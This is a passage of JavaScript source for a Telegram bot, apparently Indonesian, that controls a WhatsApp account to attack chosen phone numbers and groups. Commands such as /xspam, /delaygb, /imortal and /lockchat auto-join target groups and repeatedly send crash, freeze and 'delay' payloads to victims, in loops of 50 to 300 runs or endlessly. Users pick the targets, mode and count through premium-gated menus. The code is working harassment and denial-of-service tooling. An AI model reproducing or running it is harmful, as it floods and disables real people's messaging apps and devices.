      return ctx.reply("❌ Gagal mendapatkan ID Grup. Pastikan bot belum di-banned atau link undangan masih aktif!");
    }

  } catch (globalError) {
    console.error("Error Group Join:", globalError);
    return ctx.reply("❌ Terjadi kesalahan sistem saat memproses grup.");
  }

  // --- JIKA JID BERHASIL DIDAPATKAN, PROSES SPAM SEPERTI BIASA ---
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : BLANK CLICK (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : READY & SENDING</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
  });

  // Proses Eksekusi Spamming
  await (async () => {
    for (let i = 0; i < 50; i++) {
        await FrezeXblank(sock, target);
        await frgb(sock, target);
        await sleep(1500);
    }
  })();

  // Update status setelah selesai
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : BLANK CLICK (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : SPAM COMPLETE</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
    }
  );
});

bot.command("delaygb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const text = ctx.message.text || "";
  
  // Regex super aman untuk mengambil kode undangan WhatsApp Group
  const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);
  
  if (!inviteCodeMatch) {
    return ctx.reply(`❌ Format link salah!\nExample: /delaygb https://chat.whatsapp.com/InviteCodeGrupNya`);
  }

  const inviteCode = inviteCodeMatch[1]; // Ini kode bersihnya (tanpa spasi / parameter sisa)
  let target = null;

  try {
    // LANGKAH 1: Cek internal cache bot dulu (apakah bot sudah di dalam grup?)
    try {
      const chats = await sock.groupFetchAllParticipating();
      const groups = Object.values(chats);
      
      // Cari yang metadata inviteCode-nya sama, atau id grup-nya sama (jika ada)
      const matchingGroup = groups.find(g => g.inviteCode === inviteCode || g.id?.includes(inviteCode));
      if (matchingGroup) {
        target = matchingGroup.id;
      }
    } catch (cacheError) {
      console.log("Gagal fetch internal cache, lanjut metode langsung...");
    }

    // LANGKAH 2: Jika JID belum ketemu dari cache, pakai groupGetInviteInfo / groupAcceptInvite
    if (!target) {
      try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        target = groupInfo.id;
        
        // Langsung auto join
        await sock.groupAcceptInvite(inviteCode);
      } catch (inviteError) {
        // Handle kondisi unik: Baileys sering return error 409 (conflict) kalau bot SEBENARNYA SUDAH JOIN
        if (inviteError.status === 409 || String(inviteError).includes("conflict")) {
          // Jika error karena sudah join, coba tebak atau ekstrak JID dari object error
          target = inviteError.context?.jid || inviteError.jid;
        }
        
        // Jika masih tidak ketemu target JID-nya, coba paksa join langsung tanpa GetInfo
        if (!target) {
          try {
            target = await sock.groupAcceptInvite(inviteCode);
          } catch (forceJoinError) {
            // Jika force join juga mengembalikan info JID (di beberapa versi Baileys)
            if (forceJoinError.context?.jid) target = forceJoinError.context.jid;
          }
        }
      }
    }

    // PENGAMAN TERAKHIR: Jika semua cara di atas gagal mendapatkan JID (@g.us)
    if (!target) {
      return ctx.reply("❌ Gagal mendapatkan ID Grup. Pastikan bot belum di-banned atau link undangan masih aktif!");
    }

  } catch (globalError) {
    console.error("Error Group Join:", globalError);
    return ctx.reply("❌ Terjadi kesalahan sistem saat memproses grup.");
  }

  // --- JIKA JID BERHASIL DIDAPATKAN, PROSES SPAM SEPERTI BIASA ---
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY HARD (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : READY & SENDING</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
  });

  // Proses Eksekusi Spamming
  await (async () => {
    for (let i = 0; i < 100; i++) {
        await X7DelayGb(sock, target);
        await sleep(1500);
    }
  })();

  // Update status setelah selesai
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY HARD (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : SPAM COMPLETE</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
    }
  );
});

//////// -- CASE BUG BIASA --- \\\\\\\\\\\
bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  (async () => {
    while (true) {
      await delaycrashV4(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("xspam1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam1 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await dingleyhard(sock, target, ptcp = true);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("xspam2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam2 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await Delayft(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("xspam3", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam3 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await RX7DELAYNEW(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});


bot.command("xspam4", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam4 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await DelayBulldoNew(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("combo1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /combo1 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await SendFullPaymentStyle(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

// ─── /imortal ──────────────────────────────────────────────────────────────
const imortalSession = new Map();
bot.command("imortal", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return ctx.reply(`📌 Example:\n/imortal 62xxx\n/imortal 62xxx,62xx`);

  const rawTargets = args.split(/[,\s]+/).filter(Boolean);
  const targets = rawTargets.map(t => t.replace(/[^0-9]/g, ""));
  if (targets.length === 0) return ctx.reply("❌ Target tidak valid!");

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

  const targetDisplay = targets.map(t => `• ${t}`).join("\n");

  const sent = await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption:
      `<blockquote>⚙️ <b>XYLENT IMORTAL SYSTEM</b>\n\n` +
      `🤍 User    : ${username}\n` +
      `🎯 Target  : ${targets.length} nomor\n${targetDisplay}\n\n` +
      `📌 Pilih <b>MODE</b> terlebih dahulu:</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "👻 DELAY HARD",  callback_data: `imortal_mode_delay_${ctx.from.id}`, style: 'danger' },
          { text: "👻 DELAY HARD2",      callback_data: `imortal_mode_hard2_${ctx.from.id}`, style: 'danger' },
        ],
        [
          { text: "⚡ Bulldozer",       callback_data: `imortal_mode_bulldoo_${ctx.from.id}`, style: 'primary'  },
          { text: "🥵 Delay Freeze",        callback_data: `imortal_mode_freezedelay_${ctx.from.id}`, style: 'primary' },
        ],
        [
          { text: "🔥 Fc Ios",   callback_data: `imortal_mode_fcios_${ctx.from.id}`, style: 'danger' },
        ],
        [
          { text: "❌ Cancel",      callback_data: `imortal_cancel_${ctx.from.id}`, style: 'success' },
        ]
      ]
    }
  });

  imortalSession.set(ctx.from.id, {
    targets,
    username,
    chatId : ctx.chat.id,
    msgId  : sent.message_id,
    mode   : null,
    jumlah : null,
  });
});

// ─── CALLBACK: Pilih Mode ──────────────────────────────────────────────────
bot.action(/^imortal_mode_(delay|hard2|fcios|freezedelay|bulldoo|ghost)_(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const userId = parseInt(ctx.match[2]);
  if (ctx.from.id !== userId) return ctx.answerCbQuery("❌ Bukan sesimu!");

  const sess = imortalSession.get(userId);
  if (!sess) return ctx.answerCbQuery("❌ Sesi tidak ditemukan.");

  const modeMap = {
    delay : "👻 DELAY HARD",
    hard2: "👻 DELAY HARD2",
    bulldoo : "⚡ BULLDOZER",
    freezedelay : "🥵 DELAY FREEZE",
    fcios  : "🔥Fc Ios",
  };

  sess.mode = modeMap[ctx.match[1]];
  const targetDisplay = sess.targets.map(t => `• ${t}`).join("\n");

  await ctx.telegram.editMessageCaption(
    sess.chatId, sess.msgId, null,
    `<blockquote>⚙️ <b>XYLENT IMORTAL SYSTEM</b>\n\n` +
    `🤍 User    : ${sess.username}\n` +
    `🎯 Target  : ${sess.targets.length} nomor\n${targetDisplay}\n` +
    `💤 Mode    : <b>${sess.mode}</b>\n\n` +
    `📌 Pilih <b>JUMLAH</b> loop:</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "50x",    callback_data: `imortal_loop_50_${userId}`, style: 'primary'  },
            { text: "100x",   callback_data: `imortal_loop_100_${userId}`, style: 'primary'  },
            { text: "200x",   callback_data: `imortal_loop_200_${userId}`, style: 'danger'  },
            { text: "300x",   callback_data: `imortal_loop_300_${userId}`, style: 'danger'  },
          ],
          [
            { text: "✏️ Custom", callback_data: `imortal_loop_custom_${userId}`, style: 'primary'  },
            { text: "❌ Cancel", callback_data: `imortal_cancel_${userId}`, style: 'danger'  },
          ]
        ]
      }
    }
  );
});

// ─── CALLBACK: Pilih Jumlah Loop ──────────────────────────────────────────
bot.action(/^imortal_loop_(\d+|custom)_(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const userId = parseInt(ctx.match[2]);
  if (ctx.from.id !== userId) return ctx.answerCbQuery("❌ Bukan sesimu!");

  const sess = imortalSession.get(userId);
  if (!sess) return ctx.answerCbQuery("❌ Sesi tidak ditemukan.");

  if (ctx.match[1] === "custom") {
    sess.waitingCustom = true;
    const targetDisplay = sess.targets.map(t => `• ${t}`).join("\n");
    await ctx.telegram.editMessageCaption(
      sess.chatId, sess.msgId, null,
      `<blockquote>⚙️ <b>XYLENT IMORTAL SYSTEM</b>\n\n` +
      `🤍 User    : ${sess.username}\n` +
      `🎯 Target  : ${sess.targets.length} nomor\n${targetDisplay}\n` +
      `💤 Mode    : <b>${sess.mode}</b>\n\n` +
      `✏️ Ketik jumlah loop (50 - 300):</blockquote>`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
    );
    return;
  }

  sess.jumlah = parseInt(ctx.match[1]);
  await runImortal(ctx, sess, userId);
});

// ─── HANDLER: Custom loop input ────────────────────────────────────────────
bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const sess   = imortalSession.get(userId);
  if (!sess || !sess.waitingCustom) return next();

  const num = parseInt(ctx.message.text.trim());
  if (isNaN(num) || num < 1 || num > 9999) {
    return ctx.reply("❌ Masukkan angka valid (50–300)");
  }

  sess.jumlah        = num;
  sess.waitingCustom = false;

  try { await ctx.deleteMessage(); } catch (_) {}

  await runImortal(ctx, sess, userId);
});

// ─── CALLBACK: Cancel ──────────────────────────────────────────────────────
bot.action(/^imortal_cancel_(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery("Dibatalkan.");
  const userId = parseInt(ctx.match[1]);
  if (ctx.from.id !== userId) return;

  imortalSession.delete(userId);

  try {
    await ctx.telegram.editMessageCaption(
      ctx.callbackQuery.message.chat.id,
      ctx.callbackQuery.message.message_id,
      null,
      `<blockquote>❌ <b>Dibatalkan.</b></blockquote>`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
    );
  } catch (_) {}
});

// ─── FUNGSI UTAMA: Jalankan imortal ────────────────────────────────────────
async function runImortal(ctx, sess, userId) {
  const { targets, username, chatId, msgId, mode, jumlah } = sess;
  const targetDisplay = targets.map(t => `• ${t}`).join("\n");

  await ctx.telegram.editMessageCaption(
    chatId, msgId, null,
    `<blockquote>💤 MODE : INVISIBLE DELAY  HARD\n` +
      `🤍 User    : ${username}\n` +
      `🎯 Target  : ${targets.length} nomor\n${targetDisplay}\n` +
      `💤 Mode    : <b>${mode}</b>\n` +
      `⚡ Loop    : <b>${jumlah}x</b>\n` +
      `🚀 Result  : SUCCESS SEND</blockquote>`,
    {
     parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: targets.map(t => [
            { text: `㋡ Check Target`, url: `https://wa.me/${t}`, style: 'danger' }
          ])
        }
      }
    );

  try {
    for (const t of targets) {
      const target = t + "@s.whatsapp.net";
      for (let i = 0; i < jumlah; i++) {
        switch (mode) {
          case "👻 DELAY HARD": await MBGCOMBO(sock, target);  await sleep(2500);  break;
          case "👻 DELAY HARD2": await RX7COMBO(sock, target); await sleep(2500); break;
          case "⚡ BULLDOZER":   await DelayBulldoNew(sock, target);  await sleep(2500);  break;
          case "🥵  DELAY FREEZE":  await SendFullPaymentStyle(sock, target); await sleep(2500); break;
          case "🔥Fc Ios":  await iosorder(target); break;
        }
        await sleep(1500);
      }
    }

    await ctx.telegram.editMessageCaption(
      chatId, msgId, null,
      `<blockquote>💤 MODE : INVISIBLE DELAY  HARD\n` +
      `🤍 User    : ${username}\n` +
      `🎯 Target  : ${targets.length} nomor\n${targetDisplay}\n` +
      `💤 Mode    : <b>${mode}</b>\n` +
      `⚡ Loop    : <b>${jumlah}x</b>\n` +
      `🚀 Result  : SUCCESS SEND</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: targets.map(t => [
            { text: `㋡ Check Target`, url: `https://wa.me/${t}`, style: 'danger' }
          ])
        }
      }
    );
  } catch (e) {
    await ctx.telegram.editMessageCaption(
      chatId, msgId, null,
      `<blockquote>❌ <b>ERROR!</b>\n${e.message}</blockquote>`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
    );
  }

  imortalSession.delete(userId);
}

bot.command("galaxy", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /galaxy 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await CrmXcarousel(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("combo", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /combo 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await MBGCOMBO(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("stcblank", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /stcblank 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : BLANK STIKER

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await stickerUi(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : BLANK STIKER

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("uisystem", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uisystem 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : UI SYSTEM

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await button(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : UI SYSTEM

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("lockchat", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /lockchat 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : LOCK CHAT

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await lockchat(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : LOCK CHAT

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
